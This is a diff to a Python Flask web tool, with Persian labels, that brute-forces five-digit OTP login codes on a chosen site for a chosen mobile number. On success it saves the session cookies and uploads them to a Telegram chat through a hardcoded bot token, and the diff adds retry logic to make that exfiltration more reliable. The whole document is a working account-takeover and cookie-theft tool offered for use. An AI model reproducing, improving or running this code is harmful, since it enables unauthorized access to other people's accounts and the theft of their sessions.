@@ -7,6 +7,8 @@ import sys
 from flask import Flask, render_template_string, request
 from flask_socketio import SocketIO, emit
 import threading
+import os
+from datetime import datetime
 
 # تنظیمات تلگرام
 TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"
@@ -20,17 +22,50 @@ running = False
 found_success = False
 progress_log = []
 
-def send_file_to_telegram(file_path):
+def send_file_to_telegram(file_path, retries=3):
+    """ارسال فایل به تلگرام با تلاش مجدد در صورت خطا"""
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-    with open(file_path, 'rb') as file:
-        files = {'document': file}
-        data = {'chat_id': TELEGRAM_CHAT_ID}
-        response = requests.post(url, data=data, files=files)
-        if response.status_code == 200:
-            progress_log.append(f"File {file_path} sent to Telegram successfully!")
-        else:
-            progress_log.append(f"Failed to send file to Telegram: {response.text}")
-    socketio.emit('update_progress', {'log': progress_log[-1]})
+    for attempt in range(retries):
+        try:
+            if not os.path.exists(file_path):
+                progress_log.append(f"Error: File {file_path} does not exist!")
+                socketio.emit('update_progress', {'log': progress_log[-1]})
+                return False
+            with open(file_path, 'rb') as file:
+                files = {'document': file}
+                data = {'chat_id': TELEGRAM_CHAT_ID}
+                response = requests.post(url, data=data, files=files, timeout=10)
+                response.raise_for_status()
+                progress_log.append(f"File {file_path} sent to Telegram successfully!")
+                socketio.emit('update_progress', {'log': progress_log[-1]})
+                return True
+        except (requests.exceptions.RequestException, FileNotFoundError) as e:
+            progress_log.append(f"Failed to send {file_path} to Telegram (attempt {attempt + 1}/{retries}): {str(e)}")
+            socketio.emit('update_progress', {'log': progress_log[-1]})
+            if attempt < retries - 1:
+                time.sleep(2)
+    return False
+
+def save_and_send_cookies(cookies, code_str):
+    """تابع زنده برای ذخیره و ارسال کوکی‌ها"""
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    cookies_file = f"cookies_success_{code_str}_{timestamp}.txt"
+    
+    cookie_jar = MozillaCookieJar(cookies_file)
+    for cookie in cookies:
+        cookie_jar.set_cookie(cookie)
+    cookie_jar.save(ignore_discard=True, ignore_expires=True)
+    
+    if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
+        progress_log.append(f"Cookies saved in {cookies_file}")
+        socketio.emit('update_progress', {'log': progress_log[-1]})
+        success = send_file_to_telegram(cookies_file)
+        if not success:
+            progress_log.append(f"Critical: Failed to send cookies {cookies_file} to Telegram after retries!")
+            socketio.emit('update_progress', {'log': progress_log[-1]})
+    else:
+        progress_log.append(f"Error: Failed to save cookies to {cookies_file}")
+        socketio.emit('update_progress', {'log': progress_log[-1]})
 
 def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
     headers = {
@@ -78,20 +113,17 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                            f"Message: {json_response['data']['message']}\n"
                            f"Redirect to: {json_response['data']['redirect']}")
                     progress_log.append(msg)
-                    socketio.emit('update_progress', {'log': progress_log[-1]})
-                    cookie_jar = MozillaCookieJar(f"cookies_success_{code_str}.txt")
-                    for cookie in response.cookies:
-                        cookie_jar.set_cookie(cookie)
-                    cookie_jar.save(ignore_discard=True, ignore_expires=True)
-                    progress_log.append(f"Cookies saved in cookies_success_{code_str}.txt")
-                    socketio.emit('update_progress', {'log': progress_log[-1]})
-                    output_file = f"success_{code_str}.txt"
+                    socketio.emit('update_progress', {'log': msg})
+
+                    save_and_send_cookies(response.cookies, code_str)
+
+                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    output_file = f"success_{code_str}_{timestamp}.txt"
                     with open(output_file, 'w', encoding='utf-8') as f:
-                        f.write(msg + f"\nCookies file: cookies_success_{code_str}.txt\n")
+                        f.write(msg + f"\nCookies file: {cookies_file}\n")
                     progress_log.append(f"Output saved in {output_file}")
                     socketio.emit('update_progress', {'log': progress_log[-1]})
                     send_file_to_telegram(output_file)
-                    send_file_to_telegram(f"cookies_success_{code_str}.txt")
                     return True
                 else:
                     progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
@@ -148,7 +180,7 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                     socketio.emit('update_progress', {'log': progress_log[-1]})
 
         if not found_success:
-            time.sleep(0.5)  # کاهش تأخیر از 1 ثانیه به 0.5 ثانیه
+            time.sleep(0.5)
 
     if not found_success:
         progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
@@ -167,6 +199,8 @@ def index():
         <style>
             body { direction: rtl; font-family: Arial, sans-serif; }
             #progress { height: 300px; overflow-y: auto; }
+            .range-option { transition: all 0.2s; }
+            .range-option:hover { background-color: #e5e7eb; }
         </style>
     </head>
     <body class="bg-gray-100 p-6">
@@ -175,7 +209,7 @@ def index():
             <form id="form" class="space-y-4">
                 <div>
                     <label class="block text-sm font-medium text-gray-700">هاست:</label>
-                    <input type="text" id="host" class="mt-1 block w-full p-2 border rounded" value="www.arzanpanel-iran.com">
+                    <input type="text" id="host" class="mt-1 block w-full p-2 border rounded" value="www.host.com">
                 </div>
                 <div>
                     <label class="block text-sm font-medium text-gray-700">Nonce:</label>
@@ -183,25 +217,45 @@ def index():
                 </div>
                 <div>
                     <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
-                    <input type="text" id="mobile" class="mt-1 block w-full p-2 border rounded" value="09039495749">
+                    <input type="text" id="mobile" class="mt-1 block w-full p-2 border rounded" value="0914">
                 </div>
                 <div>
                     <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
                     <input type="number" id="connections" class="mt-1 block w-full p-2 border rounded" value="20">
                 </div>
                 <div>
-                    <label class="block text-sm font-medium text-gray-700">محدوده شروع و پایان:</label>
-                    <div class="space-y-2">
-                        <label><input type="radio" name="range" value="0-10000" checked> 0-1</label>
-                        <label><input type="radio" name="range" value="10000-20000"> 1-2</label>
-                        <label><input type="radio" name="range" value="20000-30000"> 2-3</label>
-                        <label><input type="radio" name="range" value="30000-40000"> 3-4</label>
-                        <label><input type="radio" name="range" value="40000-50000"> 4-5</label>
-                        <label><input type="radio" name="range" value="50000-60000"> 5-6</label>
-                        <label><input type="radio" name="range" value="60000-70000"> 6-7</label>
-                        <label><input type="radio" name="range" value="70000-80000"> 7-8</label>
-                        <label><input type="radio" name="range" value="80000-90000"> 8-9</label>
-                        <label><input type="radio" name="range" value="90000-99999"> 9-10</label>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">محدوده شروع و پایان:</label>
+                    <div class="grid grid-cols-2 gap-2 max-h-40 overflow-y-auto p-2 border rounded">
+                        <label class="range-option p-2 rounded cursor-pointer">
+                            <input type="radio" name="range" value="0-10000" checked class="mr-2"> 00000 - 10000
+                        </label>
+                        <label class="range-option p-2 rounded cursor-pointer">
+                            <input type="radio" name="range" value="10000-20000" class="mr-2"> 10000 - 20000
+                        </label>
+                        <label class="range-option p-2 rounded cursor-pointer">
+                            <input type="radio" name="range" value="20000-30000" class="mr-2"> 20000 - 30000
+                        </label>
+                        <label class="range-option p-2 rounded cursor-pointer">
+                            <input type="radio" name="range" value="30000-40000" class="mr-2"> 30000 - 40000
+                        </label>
+                        <label class="range-option p-2 rounded cursor-pointer">
+                            <input type="radio" name="range" value="40000-50000" class="mr-2"> 40000 - 50000
+                        </label>
+                        <label class="range-option p-2 rounded cursor-pointer">
+                            <input type="radio" name="range" value="50000-60000" class="mr-2"> 50000 - 60000
+                        </label>
+                        <label class="range-option p-2 rounded cursor-pointer">
+                            <input type="radio" name="range" value="60000-70000" class="mr-2"> 60000 - 70000
+                        </label>
+                        <label class="range-option p-2 rounded cursor-pointer">
+                            <input type="radio" name="range" value="70000-80000" class="mr-2"> 70000 - 80000
+                        </label>
+                        <label class="range-option p-2 rounded cursor-pointer">
+                            <input type="radio" name="range" value="80000-90000" class="mr-2"> 80000 - 90000
+                        </label>
+                        <label class="range-option p-2 rounded cursor-pointer">
+                            <input type="radio" name="range" value="90000-99999" class="mr-2"> 90000 - 99999
+                        </label>
                     </div>
                 </div>
                 <div class="flex space-x-4">
@@ -221,7 +275,7 @@ def index():
             const startBtn = document.getElementById('start');
             const stopBtn = document.getElementById('stop');
             const progressDiv = document.getElementById('progress');
-            const maxLogs = 20;  // حداکثر تعداد لاگ‌ها
+            const maxLogs = 20;
 
             socket.on('connect', () => {
                 console.log('Connected to WebSocket');
@@ -232,7 +286,6 @@ def index():
                 const log = document.createElement('p');
                 log.textContent = data.log;
                 progressDiv.appendChild(log);
-                // محدود کردن تعداد لاگ‌ها
                 while (progressDiv.children.length > maxLogs) {
                     progressDiv.removeChild(progressDiv.firstChild);
                 }
